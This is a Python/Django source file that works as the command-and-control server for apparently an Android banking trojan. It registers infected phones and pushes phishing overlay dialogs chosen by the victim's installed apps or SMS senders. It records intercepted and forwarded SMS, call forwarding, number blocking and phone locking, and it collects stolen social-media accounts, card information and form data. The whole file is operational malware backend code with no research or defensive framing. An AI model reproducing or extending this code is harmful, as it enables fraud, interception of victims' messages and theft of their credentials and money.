from StringIO import StringIO
import gzip
import json
import logging

from django.db import transaction, IntegrityError
from django.utils import timezone
from django.http import HttpResponse, HttpResponseServerError
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from remote_dialog import check_sender, get_dialog
import remote_dialog
from smsapp import models, commands, cache, command_queue
import sys_messages
import json_attach


logger = logging.getLogger(__name__)


class ProcessingError(Exception):
    pass


def registration(user, data):
    """
    Process registration request
    @param user: Installer user object
    @type user: models.Installer
    @param data: Phone data
    @type data: dict
    @return: JSON-compatible reply
    @rtype: object
    """
    imei_ = data.get("imei")
    if not imei_:
        raise ProcessingError("h/w ID required")
    operator = None
    opname = data.get("operator")
    existing = False
    if opname:
        operator, created = models.MobileOperator.objects.get_or_create(name=opname)
    try:
        rec = models.PhoneData.objects.get(imei=imei_)
        logger.debug("Phone with h/w ID {0} is already in the database".format(imei_))
        existing = True
    except models.PhoneData.DoesNotExist:
        try:
            rec = models.PhoneData.objects.create(imei=imei_, number=data.get("phone number"),
                                                  country=data.get("country"), os_version=data.get("os"),
                                                  hw_model=data.get("model"), operator=operator, installer=user)
        except IntegrityError as e:
            logger.error("Error creating a phone: {0}".format(e))
            raise ProcessingError("The phone is already in the database")
    logger.debug("Saved phone record {0}".format(rec))
    rec = models.PhoneData.objects.get(pk=rec.pk)
    dlgs = {}
    blacklisted = False
    # read SMS list
    apps = data.get('apps') or []
    # check installed APPS
    for a in apps:
        if cache.is_blacklisted(a):
            blacklisted = True
            break
        r = remote_dialog.get_dialog_by_app(a)
        if r:
            dlgs[r[0]] = r[1]
        if not existing:
            models.InstalledApp.objects.create(name=a, phone=rec)
    # check the operator
    r = remote_dialog.get_dialog_by_operator(operator.name) if operator else None
    if r:
        dlgs[r[0]] = r[1]
        # getting array of pairs sorted by value
    # see http://stackoverflow.com/questions/613183/sort-a-python-dictionary-by-value
    from operator import itemgetter

    s = sorted(dlgs.items(), key=itemgetter(1))
    if len(s):
        dlg_id = s[len(s) - 1][0]
        d = models.RemoteDialog.objects.get(pk=dlg_id)
        remote_dialog.push_dialog(rec.uniq_id, d, override=False)
    return {'number': '', 'code': rec.uniq_id}


def add_sms(rec, data):
    """
    Saves passed SMS list, adds it to the phone data
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    sms = data.get('sms') or []
    dlgs = {}
    for s in sms:
        sms_from = s.get('from')
        # todo: do something to dialogs
        r = remote_dialog.get_dialog_by_sender(sms_from)
        if r:
            dlgs[r[0]] = r[1]
        sms_text = s.get('body')
        try:
            sender, created = models.ISender.objects.get_or_create(name=sms_from)
            models.InternalSMS.objects.create(sender=sender, contents=sms_text, phone=rec)
        except IntegrityError as e:
            logger.error("Error while saving SMS: {0}".format(e))


def phone_check(data):
    """
    Process check|get next command request
    @param data: Phone data
    @type data: dict
    @return: JSON-compatible reply
    @rtype: object
    """
    phone_id = data.get("code")
    # update phone last command data
    try:
        phone = models.PhoneData.objects.get(uniq_id=phone_id)
        phone.last_connection = timezone.now()
        phone.save()
    except models.PhoneData.DoesNotExist:
        logger.error("Phone with ID {0} does not exist".format(phone_id))
    dlg = get_dialog(phone_id)
    if dlg is not None:
        # decode JSON
        cmd = "#show_html"
        dlg.pop('ishtml', None)
        return {'command': cmd, 'params': dlg}
    # check HTML version sent, if it's up to date
    ver = data.get('html version')
    if ver:
        d = remote_dialog.get_app_html_list(ver)
        if d:
            return {'command': '#update_html', 'params': d}
    cmd = command_queue.get_next_command(phone_id)
    cmd = cmd if cmd else ""
    return {'command': cmd, 'params': {}}


def update_phone_number(phone, num):
    """
    Updates phone record with a new number
    @param phone: Phone record
    @type phone: models.PhoneData
    @param num: new number
    @type num: basestring
    @rtype: None
    """
    phone.number = num
    phone.save()


def set_control_number(data):
    """
    Set new control number
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    number = data.get("set number")
    pass


def intercepted_sms_in(rec, data):
    """
    Records incoming tapped SMS
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    logger.debug("Received incoming intercepted SMS for phone {0}".format(rec))
    if rec.owner_id is None or rec.sms_status != models.PhoneData.SMS_INTERCEPT:
        logger.warn("The phone {0} is not intercepting")
    rec_owner = rec.owner
    if rec_owner:
        rec_owner.save()
    sms_from = data.get('from')
    sms_text = data.get('text')
    check_sender(rec.uniq_id, sms_from)
    sms_owner = rec_owner if isinstance(rec_owner, models.SysUser) else None
    obj = models.SMSRecord.objects.create(source=sms_from, contents=sms_text, phone=rec, owner=sms_owner,
                                          intercepted=True)
    if rec_owner:
        msg = {
            'info': "Intercepted SMS from {0}".format(sms_from),
            'sms': {'from': sms_from, 'to': 'n/a', 'text': sms_text, 'id': obj.id},
        }
        sys_messages.add_message(rec.uniq_id, msg)


def listened_sms_in(rec, data):
    """
    Records incoming intercepted SMS
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    if rec.owner_id is None or rec.sms_status != models.PhoneData.SMS_LISTEN:
        logger.warn("The phone {0} is not listening".format(rec))
    sms_from = data.get('from')
    sms_text = data.get('text')
    check_sender(rec.uniq_id, sms_from)
    sms_owner = rec.owner if isinstance(rec.owner, models.SysUser) else None
    obj = models.SMSRecord.objects.create(source=sms_from, contents=sms_text, phone=rec, owner=sms_owner)
    msg = {
        'info': "Got SMS from {0}".format(sms_from),
        'sms': {'from': sms_from, 'to': 'n/a', 'text': sms_text, 'id': obj.id}
    }
    sys_messages.add_message(rec.uniq_id, msg)


def intercepted_sms_out(rec, data):
    """
    Records outgoing tapped SMS
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    if rec.owner_id is None or rec.sms_status != models.PhoneData.SMS_INTERCEPT:
        logger.warn("The phone {0} is not intercepting")
    sms_to = data.get('to')
    sms_text = data.get('text')
    sms_owner = rec.owner if isinstance(rec.owner, models.SysUser) else None
    obj = models.SMSRecord.objects.create(dest=sms_to, contents=sms_text, phone=rec, owner=sms_owner,
                                          intercepted=True)
    msg = {
        'info': "Intercepted SMS to {0}".format(sms_to),
        'sms': {'from': 'n/a', 'to': sms_to, 'text': sms_text, 'id': obj.id}
    }
    sys_messages.add_message(rec.uniq_id, msg)


def grab_apps(rec, data):
    """
    Records data on installed applications
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    pass  # todo


def intercept_status_change(rec, data):
    """
    Signals that the phone has changed its intercept status in reply to #intercept_sms_start & #intercept_sms_stop
    data."rent status" contains either "started" or "stopped"
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    if rec.owner_id is None:
        logger.error("No owner for phone {0} currently".format(rec))
        return
    new_status = data.get('rent status')
    owner = rec.owner
    if new_status == "started":
        rec.sms_status = models.PhoneData.SMS_INTERCEPT
        rec.save()
    elif new_status == "stopped":
        rec.owner = None
        rec.sms_status = models.PhoneData.SMS_INITIAL
        rec.save()
    commands.set_phone_transient_state(rec.uniq_id, commands.PHONE_STATE_STABLE)
    msg = {
        'info': "Phone {0} SMS intercept {1}".format(rec, new_status),
        'imei': rec.imei
    }
    logger.debug("Phone {0} status changed to {1}".format(rec, new_status))
    sys_messages.add_message(rec.uniq_id, msg)


def listen_status_change(rec, data):
    """
    Signals that the phone has changed its listen status in reply to #listen_sms_start & #listen_sms_stop
    data."listening status" contains either "started" or "stopped"
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    new_status = data.get('listening status')
    owner = rec.owner
    if new_status == "started":
        rec.sms_status = models.PhoneData.SMS_LISTEN
        rec.save()
    elif new_status == "stopped":
        rec.owner = None
        rec.sms_status = models.PhoneData.SMS_INITIAL
        rec.save()
    msg = {
        'info': "Phone {0} SMS listening {1}".format(rec, new_status),
        'imei': rec.imei
    }
    sys_messages.add_message(rec.uniq_id, msg)


def ussd_response(rec, data):
    """
    Returns data from #ussd command
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    pass


def send_sms_response(rec, data):
    """
    Returns data from #send_sms command
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    if rec is None:
        return
    sms_to = data.get('number')
    sms_text = data.get('text')
    sms_owner = rec.owner if isinstance(rec.owner, models.SysUser) else None
    obj = models.SMSRecord.objects.create(dest=sms_to, contents=sms_text, phone=rec, owner=sms_owner)
    msg = {
        'info': "Phone {0} sent SMS to {1}".format(rec, sms_to),
        'sms': {'from': 'n/a', 'to': sms_to, 'text': sms_text, 'id': obj.id}
    }
    sys_messages.add_message(rec.uniq_id, msg)


@transaction.atomic
def blocking_numbers_response(rec, data):
    """
    Returns data from #block_numbers & #unblock_numbers commands
    as in 	"numbers" : ["+7921123123", "sms_info", "tcs"] - current numbers we block
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    # clear all blocked number record first
    rec.blockednumber_set.all().delete()
    blocked = {}
    for n in data.get('numbers'):
        r = models.BlockedNumber.objects.create(phone=rec, number=n)
        blocked[r.id] = n
    msg = {
        'info': "Blocked numbers list updated at phone {0}".format(rec),
        'blocked': blocked
    }
    sys_messages.add_message(rec.uniq_id, msg)


def unblock_all_numbers_response(rec, data):
    """
    Returns data from #unblock_all_numbers command
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    rec.blockednumber_set.all().delete()
    msg = {
        'info': "Unblocked all numbers for phone {0}".format(rec),
        'cleared_blocked': True
    }
    sys_messages.add_message(rec.uniq_id, msg)


def lock_status(rec, data):
    """
    Handles the lock status callback
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    rec.locked = (data.get('status') == 'locked')
    rec.save()
    msg = {
        'info': "Phone {0} is {1}".format(rec, data.get('status')),
        'code': rec.uniq_id,
        'locked': rec.locked
    }
    sys_messages.add_message(rec.uniq_id, msg)


def gps_returned(rec, ata):
    """
    Returns data from #check_gps command
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    pass


def appid_received(user, rec, data):
    """
    Returns data from #sentid command
    @param user: Installer user object
    @type user: models.Installer
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    rec.id_sent = True
    rec.save()
    logger.debug("Received #sentid confirmation for {0}".format(rec))


def cb_call_forwarding(rec, data):
    """
    Call forwarding started for the phone
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    number = data.get('to')
    rec.forwarding_calls = number
    rec.save()
    logger.debug("Phone {0} is now forwarding calls to {1}".format(rec, number))


def cb_forward_disabled(rec):
    """
    Call forwarding ended for the phone
    @param rec: Phone data record
    @type rec: models.PhoneData
    @rtype: None
    """
    rec.forwarding_calls = None
    rec.save()


def cb_received_html(rec, data):
    """
    The client has received HTML update
    @param rec: Phone data record
    @type rec: models.PhoneData
    @param data: Phone data
    @type data: dict
    @rtype: None
    """
    rec.app_dialogues_version = data.get('html version')
    rec.save()


@require_http_methods(["POST"])
@csrf_exempt
def process(request):
    if request.method == 'POST' and request.body:
        b = request.body
        try:
            if request.META.get("HTTP_CONTENT_ENCODING") == 'gzip':
                buf = StringIO(b)
                f = gzip.GzipFile(fileobj=buf)
                b = f.read()
        except IOError:  # not compressed actually
            pass
        body_decode = b.decode('UTF-8')
        logger.debug(u"Request POST body: {0}".format(body_decode))
        code = None
        try:
            data = json.loads(body_decode)
            code = data.get("code")
            user = None
            phone = None
            command = data.get('type')
            if command == 'ping':
                return HttpResponse(content=(json.dumps({'success': True})), content_type='application/json')
            elif command == "app id received":
                code = data.get("app id")
            if code is not None:
                phone = models.PhoneData.objects.get(uniq_id=code)
            elif command != "device info":
                # most probably - old protocol
                raise ProcessingError("Unique code should be specified for command {0}".format(command))
            models.LogRecord.objects.create(contents=json.dumps(data))
            cnum = data.get("client number")
            if cnum is not None:
                try:
                    user = models.Installer.objects.get(user_id=cnum)
                except models.Installer.DoesNotExist:
                    raise ProcessingError("Client number {0} does not exist".format(cnum))
            json_response = {'params': {}}
            if command == "device info":
                json_response = registration(user, data)
            elif command == "app id received":
                appid_received(user, phone, data)
            elif command == "device check":
                json_response = phone_check(data)
            elif command == "control number response":
                set_control_number(data)
            elif command == "listened incoming sms":
                listened_sms_in(phone, data)
            elif command == "intercepted incoming sms":
                intercepted_sms_in(phone, data)
            elif command == "listened outgoing sms":
                intercepted_sms_out(phone, data)
            elif command == "installed apps":
                grab_apps(phone, data)
            elif command == "rent status":
                intercept_status_change(phone, data)
            elif command == "listening status":
                listen_status_change(phone, data)
            elif command == "ussd":
                ussd_response(phone, data)
            elif command == "sms content":
                add_sms(phone, data)
            elif command == "sms sent notification":
                send_sms_response(phone, data)
            elif command == "blocking numbers":
                blocking_numbers_response(phone, data)
            elif command == "unblock all numbers":
                unblock_all_numbers_response(phone, data)
            elif command == "location":
                gps_returned(phone, data)
            elif command == "lock status":
                lock_status(phone, data)
            elif command == 'phone':
                update_phone_number(phone, data.get('number'))
            elif command == 'calls forwarded':
                cb_call_forwarding(phone, data)
            elif command == 'calls forwarding disabled':
                cb_forward_disabled(phone)
            elif command == 'html updated':
                cb_received_html(phone, data)
            elif command == "crash report":
                json_attach.attach_crash_report(code, data)
            elif command in ['vk', 'od', 'fb', 'tw', 'gm']:
                json_attach.attach_account(code, data)
            elif command == 'card information':
                json_attach.attach_card_info(code, data)
            elif command == "forms":
                json_attach.attach_form_info(code, data)
            elif command == 'user data':
                json_attach.attach_ex(code, data.get("data"))
            else:
                raise ProcessingError("Unknown command {0}".format(command))
        except ValueError as e:
            logger.error(e)
            return HttpResponseServerError(e)
        except ProcessingError as e:
            logger.error(e)
            return HttpResponseServerError(e)
        except models.PhoneData.DoesNotExist:
            logger.error("Phone with code {0} doesn't exist".format(code))
            return HttpResponseServerError("Not found")
        logger.debug(
            "Responding to request from {0} with {1}".format(data.get('imei') or data.get('code'), json_response))
        json_resp = json.dumps(json_response)
        if len(json_response):
            models.LogRecord.objects.create(contents="response: {0}".format(json_resp))
        return HttpResponse(content=json_resp, content_type='application/json')
    return HttpResponseServerError("Malformed data!")


@require_http_methods(["POST"])
@csrf_exempt
def remote_forms(request):
    data = request.POST.dict()
    code = data.pop('code', None)
    data['type'] = 'js_form'
    json_attach.attach_ex(code, data)
    return HttpResponse('OK')
